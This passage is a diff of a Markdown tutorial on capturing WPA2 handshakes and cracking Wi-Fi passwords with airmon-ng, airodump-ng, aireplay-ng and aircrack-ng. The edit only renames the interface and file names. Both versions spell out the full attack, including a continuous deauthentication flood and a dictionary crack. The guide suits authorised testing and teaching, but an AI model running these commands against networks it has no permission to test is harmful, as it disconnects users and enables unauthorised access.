@@ -21,10 +21,10 @@ List all possible programs that could interfere with the wireless card. If
 # airmon-ng check kill
 ```
 
-Enable monitor mode on an interface (here it's `wlp3s0`) and check if it worked
+Enable monitor mode on an interface (here it's `wlan0`) and check if it worked.
 
 ```
-# airmon-ng start wlp3s0
+# airmon-ng start wlan0
 # airmon-ng
 ```
 
@@ -33,20 +33,20 @@ Enable monitor mode on an interface (here it's `wlp3s0`) and check if it worked
 List Wi-Fi networks and their BSSIDs, Channels, etc.
 
 ```
-# airodump-ng wlp3s0mon
+# airodump-ng wlan0mon
 ```
 
 Narrow search down to specific BSSID (MAC address).
 
 ```
-# airodump-ng wlp3s0mon -d <BSSID>
+# airodump-ng wlan0mon -d <BSSID>
 ```
 
-Capture WPA2 handshake and write it to file (e.g. `handshake1-01.cap`). Remember
+Capture WPA2 handshake and write it to file (e.g. `handshake-01.cap`). Remember
 to change interface name, if needed.
 
 ```
-# airodump-ng -w handshake -c <channel> --bssid <BSSID> wlp3s0mon
+# airodump-ng -w handshake -c <channel> --bssid <BSSID> wlan0mon
 ```
 
 **Optional in other terminal:** Simultaniously send deauthentication packets to
@@ -55,16 +55,16 @@ reauthenticate. Without this step, it might take some time to capture the
 handshake.
 
 ```
-# aireplay-ng --deauth 0 -a <BSSID> wlp3s0mon
+# aireplay-ng --deauth 0 -a <BSSID> wlan0mon
 ```
 
 ## Crack password
 
-After storing the handshake in e.g. `handshake1-01.cap`, we can finally crack the
+After storing the handshake in e.g. `handshake-01.cap`, we can finally crack the
 password using `aircrack-ng`.
 
 ```
-# aircrack-ng handshake1-01.cap -w dictionary.txt
+# aircrack-ng handshake-01.cap -w dictionary.txt
 ```
 
 Alternatively, we can extract the handshake from the `.cap` capture file and
